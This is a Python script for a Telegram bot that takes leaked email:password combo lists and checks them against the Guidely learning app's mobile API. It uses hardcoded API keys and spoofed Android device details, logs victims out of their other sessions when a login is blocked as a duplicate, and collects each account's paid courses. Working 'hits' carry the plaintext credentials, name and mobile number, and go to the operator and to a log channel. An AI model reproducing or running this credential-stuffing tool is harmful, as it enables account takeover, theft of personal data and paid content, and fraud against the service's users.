import requests
import json
import os
import time
import random
import urllib3
import threading
from datetime import datetime
import re
from concurrent.futures import ThreadPoolExecutor
from functools import partial

# --- CONFIG ---
MAX_THREADS = 10 
LOG_CHANNEL = -1004441498543
print_lock = threading.Lock()

# API Config
BASE_URL = "https://mobapi.guidely.in"
LOGIN_ENDPOINT = f"{BASE_URL}/elogin"
LOGOUT_OTP_ENDPOINT = f"{BASE_URL}/logout-all-otp"
LOGOUT_ALL_ENDPOINT = f"{BASE_URL}/logout-all"
PURCHASE_ENDPOINT = f"{BASE_URL}/purchase-history/0"

API_KEY = "85a1364c-0419-42d5-b4c9-5dbe71549743"
AUTH_KEY = "89abbc59cbc5a457a86f76fe4293201e11aa4ccb75ef0981e0936a7a4c123eeb51c7fa4006afa6718efc88dff83d01b82715abd870c665dcc5b3d4f113359110"

DEVICE_INFO = {
    "version": "2.3.60", "brand": "samsung", "device": "star2qltechn",
    "model": "SM-G960N", "versionSdkInt": "28", "versionRelease": "9",
    "product": "SM-G960N", "platform": "Android"
}

COMMON_HEADERS = {
    'accept-encoding': 'gzip', 'api-key': API_KEY,
    'content-type': 'application/json; charset=utf-8',
    'host': 'mobapi.guidely.in', 'platform': 'Android',
    'user-agent': 'Dart/3.5 (dart:io)', 'Connection': 'Keep-Alive',
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- HELPERS ---
def generate_android_id():
    import hashlib, uuid
    return hashlib.md5(str(uuid.uuid4()).encode()).hexdigest().upper()

def parse_date(date_str):
    if not date_str or date_str in ["null", "", "0000-00-00"]: return None
    try:
        date_str = date_str.split()[0]
        return datetime.strptime(date_str, "%Y-%m-%d")
    except: return None

def is_course_valid(course):
    if course.get("pay_status") != "Completed": return False
    if str(course.get("status")) != "1": return False
    validity = course.get("pro_validity", "")
    if validity and validity not in ["null", "", "0000-00-00"]:
        expiry_date = parse_date(validity)
        if expiry_date and expiry_date < datetime.now(): return False
    return True

def login_attempt(email, password, android_id=None, auth_token=None):
    if not android_id: android_id = generate_android_id()
    payload = {"email": email, "pass": password, **DEVICE_INFO, "androidId": android_id}
    headers = COMMON_HEADERS.copy()
    headers['auth'] = auth_token if auth_token else AUTH_KEY
    try:
        resp = requests.post(LOGIN_ENDPOINT, headers=headers, json=payload, timeout=25, verify=True)
        if resp.status_code == 200:
            try: return resp.json()
            except: 
                text = resp.text.strip()
                if text.startswith('{'): return json.loads(text)
        return None
    except: return None

def request_logout_otp(email):
    payload = {"emailid": email, "version": DEVICE_INFO["version"], "platform": DEVICE_INFO["platform"]}
    headers = COMMON_HEADERS.copy()
    headers['auth'] = AUTH_KEY
    try:
        resp = requests.post(LOGOUT_OTP_ENDPOINT, headers=headers, json=payload, timeout=20, verify=True)
        if resp.status_code == 200:
            try: return resp.json()
            except: return None
        return None
    except: return None

def perform_logout_all(userid):
    payload = {
        "brand": DEVICE_INFO["brand"], "device": DEVICE_INFO["device"],
        "model": DEVICE_INFO["model"], "versionSdkInt": None, "versionRelease": None,
        "product": DEVICE_INFO["product"], "androidId": None,
        "version": DEVICE_INFO["version"], "platform": DEVICE_INFO["platform"]
    }
    headers = COMMON_HEADERS.copy()
    headers['userid'] = str(userid)
    if 'auth' in headers: del headers['auth']
    try:
        resp = requests.post(LOGOUT_ALL_ENDPOINT, headers=headers, json=payload, timeout=20, verify=True)
        if resp.status_code == 200:
            try: return resp.json()
            except: return None
        return None
    except: return None

def handle_multiple_login(email, password):
    otp_resp = request_logout_otp(email)
    if not otp_resp or otp_resp.get("success") != "1": return False, None, None
    userid = otp_resp.get("userid")
    if not userid: return False, None, None
    time.sleep(random.uniform(1.0, 1.5))
    logout_resp = perform_logout_all(userid)
    if not logout_resp or logout_resp.get("success") != "1": return False, None, None
    new_token = logout_resp.get("token") or logout_resp.get("access_token")
    user_data = logout_resp.get("data", {})
    if not new_token or not user_data: return False, None, None
    return True, new_token, user_data

def fetch_purchases(userid, auth_token):
    all_courses = []
    for ptype in ["5", "1"]:
        payload = {"type": ptype, "version": DEVICE_INFO["version"], "platform": DEVICE_INFO["platform"]}
        headers = COMMON_HEADERS.copy()
        headers['auth'] = auth_token
        headers['userid'] = str(userid)
        try:
            resp = requests.post(PURCHASE_ENDPOINT, headers=headers, json=payload, timeout=20, verify=True)
            if resp.status_code == 200 and resp.text.strip():
                try:
                    data = resp.json()
                    if isinstance(data, list): all_courses.extend(data)
                except: pass
        except: pass
        time.sleep(random.uniform(0.2, 0.5))
    return all_courses

def parse_combo(line):
    line = line.strip()
    if not line or line.startswith('#'): return None
    garbage_patterns = [r'\s*={3,}[@#].*$', r'@LOGINTEXT.*$', r';https?://.*$', r'\s+https?://.*$', r'Base Link.*$', r'\*{10,}.*$', r'----https://t\.me/.*----', r':\s*None\s*:']
    for pattern in garbage_patterns: line = re.sub(pattern, '', line, flags=re.IGNORECASE)
    line = re.sub(r'^https?://[^\s:]+[^\s:]*\s*:\s*', '', line)
    line = re.sub(r'^guidely\.in[^\s:]*\s*:\s*', '', line, flags=re.IGNORECASE)
    line = re.sub(r'\s+https?://[^\s]+$', '', line)
    parts = line.split(':')
    if len(parts) < 2: return None
    username_idx = -1
    for i, part in enumerate(parts):
        part_clean = part.strip()
        if '@' in part_clean: username_idx = i; break
        if part_clean.isdigit() and len(part_clean) >= 10: username_idx = i; break
    if username_idx == -1:
        first = parts[0].strip()
        if '@' in first or (first.isdigit() and len(first) >= 10): username_idx = 0
        else: return None
    username = parts[username_idx].strip()
    password = ':'.join(parts[username_idx+1:]).strip()
    password = re.sub(r'\s+https?://.*$', '', password)
    password = re.sub(r'\s*={3,}.*$', '', password).strip()
    if not username or not password: return None
    if '@' not in username and not username.isdigit(): return None
    return username, password

def format_date(date_str):
    if not date_str or date_str in ["null", "", "0000-00-00"]: return "N/A"
    try:
        dt = parse_date(date_str)
        return dt.strftime("%d-%b-%Y") if dt else date_str[:10]
    except: return date_str[:10] if len(date_str) >= 10 else date_str

# --- BOT LOGIC ---
def check_account(line, bot, chat_id, hits_list, state, total_lines):
    parsed = parse_combo(line)
    if not parsed:
        with print_lock:
            state['checked'] += 1
            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
        return

    email, password = parsed
    
    try:
        # 1. Login
        result = login_attempt(email, password, auth_token=AUTH_KEY)
        if not result:
            with print_lock:
                state['checked'] += 1
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
            return

        success_code = result.get("success")
        user_data = None
        token = None

        if success_code == 1:
            user_data = result.get("data", {})
            token = result.get("token", "")
        elif success_code == 3:
            success, token, user_data = handle_multiple_login(email, password)
            if not success:
                with print_lock:
                    state['checked'] += 1
                    update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
                return
        else:
            with print_lock:
                state['checked'] += 1
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
            return

        userid = user_data.get("id") if user_data else None
        
        if not userid or not token:
            with print_lock:
                state['checked'] += 1
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
            return

        # 2. Fetch Purchases
        time.sleep(random.uniform(0.3, 0.6))
        all_courses = fetch_purchases(userid, token)
        valid_courses = [c for c in all_courses if is_course_valid(c)]

        # 3. Result Handling
        with print_lock:
            if valid_courses:
                state['hits'] += 1
                state['checked'] += 1
                
                # MOBILE-FRIENDLY FORMAT
                hit_text = "📱 *App : Guidely*\n"
                hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                hit_text += f"🔑 *COMBO:* `{email}:{password}`\n"
                hit_text += f"👤 *NAME:* {user_data.get('name','N/A')}\n"
                hit_text += f"📱 *MOBILE:* `{user_data.get('mobile','N/A')}`\n"
                hit_text += f"📧 *EMAIL:* `{email}`\n"
                hit_text += f"🆔 *USERID:* `{userid}`\n"
                hit_text += f"🛒 *VALID PURCHASES:* {len(valid_courses)}\n"
                hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                
                for idx, c in enumerate(valid_courses, 1):
                    title = c.get('title', 'N/A')
                    amount = c.get('paided', '0')
                    validity = c.get('pro_validity', '')
                    expiry = format_date(validity) if validity else "Lifetime"
                    purchased = c.get('created_at', '')[:10] if c.get('created_at') else 'N/A'
                    ptype = c.get('type_text', '') or c.get('ptype', 'N/A')
                    
                    hit_text += f"\n{idx}. *{title}*\n"
                    hit_text += f"   💰 *₹{amount}* | 📅 *Purchased:* {purchased}\n"
                    hit_text += f"   ⏳ *Valid till:* {expiry}\n"
                    hit_text += f"   📦 *Type:* {ptype}\n"
                
                hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                
                hits_list.append(hit_text)
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
                
                # Log Channel with Markdown
                try:
                    bot.send_message(LOG_CHANNEL, hit_text, parse_mode="Markdown")
                except: pass
            else:
                state['checked'] += 1
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)

    except Exception as e:
        with print_lock:
            state['checked'] += 1
            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
    except Exception as e:
        with print_lock:
            state['checked'] += 1
            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)

def update_progress(bot, chat_id, msg_id, hits, checked, total):
    try:
        if total > 0:
            progress_percent = int((checked / total) * 10)
            bar = "■" * progress_percent + "▢" * (10 - progress_percent)
        else:
            bar = "■■▢▢▢▢▢▢"
        
        progress_text = f"""╭───☀ 𝖢𝖧𝖤𝖢𝖪𝖨𝖭𝖦 ☀───╮
┣ ⚙️ {bar} 
┣ 📊 Hit : {hits}
┣ 📂 Loaded : {checked}/{total}
┣ 🔥 Status : Checking...
╰─── 𝐆𝐮𝐢𝐝𝐞𝐥𝐲 𝐁𝐨𝐭 ───╯"""
        
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
    except:
        pass

def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name):
    hits_list = []
    
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if l.strip()]

    total_lines = len(lines)
    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id}
    
    func = partial(check_account, bot=bot, chat_id=chat_id, hits_list=hits_list, state=state, total_lines=total_lines)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(func, lines)

    # Final File
    final_filename = "guidelyhit.txt"
    if hits_list and state['hits'] > 0:
        with open(final_filename, "w", encoding="utf-8") as f:
            for hit in hits_list:
                f.write(hit)

        with open(final_filename, "rb") as f:
            bot.send_document(chat_id, f, caption=f"✅ {platform_name} Valid Hits ({state['hits']})")
        
        if os.path.exists(final_filename):
            os.remove(final_filename)
    else:
        bot.send_message(chat_id, "❌ No valid hits found.")

    try:
        bot.delete_message(chat_id, progress_msg_id)
    except:
        pass
        
    if os.path.exists(combo_file):
        os.remove(combo_file)
